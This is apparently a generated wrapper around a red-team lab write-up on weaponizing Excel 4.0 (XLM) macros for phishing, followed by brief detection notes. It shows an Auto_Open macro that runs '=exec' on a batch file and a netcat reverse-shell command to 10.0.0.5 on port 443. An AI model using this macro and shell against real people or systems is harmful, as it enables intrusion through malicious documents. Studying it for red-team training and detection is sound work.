---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Phishing: XLM / Macro 4.0

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-phishing-with-ms-office-phishing-xlm-macro-4.0` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/phishing-xlm-macro-4.0.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This lab is based on the research performed by Stan Hegt from Outflank.

## Preserved Body

````markdown
This lab is based on the research performed by [Stan Hegt from Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/).

## Weaponization

A Microsoft Excel Spreadsheet can be weaponized by firstly inserting a new sheet of type "MS Execel 4.0 Macro":

![](<../../../_assets/phishing-xlm-create-new.png>)

We can then execute command by typing into the cells:

```text
=exec("c:\shell.cmd")
=halt()
```

As usual, the contents of shell.cmd is a simple netcat reverse shell:
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
Note how we need to rename the `A1` cell to `Auto_Open` if we want the Macros to fire off once the document is opened:

![](<../../../_assets/phishing-xlm-auto-open.png>)
## Execution

Opening the document and enabling Macros pops a reverse shell:

![](<../../../_assets/phishing-xlm-shell-auto-open.gif>)

Note that XLM Macros allows using Win32 APIs, hence shellcode injection is also possible. See the original research link below for more info.

## Observations

As usual, look for any suspicious children originating from under the Excel.exe:

![](<../../../_assets/phishing-xlm-procexp.png>)

Having a quick look at the file with a hex editor, we can see a suspicious string `shell.cmd` immediately, which is of course good news for defenders:

![](<../../../_assets/phishing-xlm-hex.png>)

![](<../../../_assets/phishing-xlm-strings.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/phishing-xlm-macro-4.0.md)

## Evidence Excerpt

```text
_asset_filenames:
- phishing-xlm-auto-open.png
- phishing-xlm-create-new.png
- phishing-xlm-hex.png
- phishing-xlm-procexp.png
- phishing-xlm-shell-auto-open.gif
- phishing-xlm-strings.png
_body: '# Phishing: XLM / Macro 4.0
```
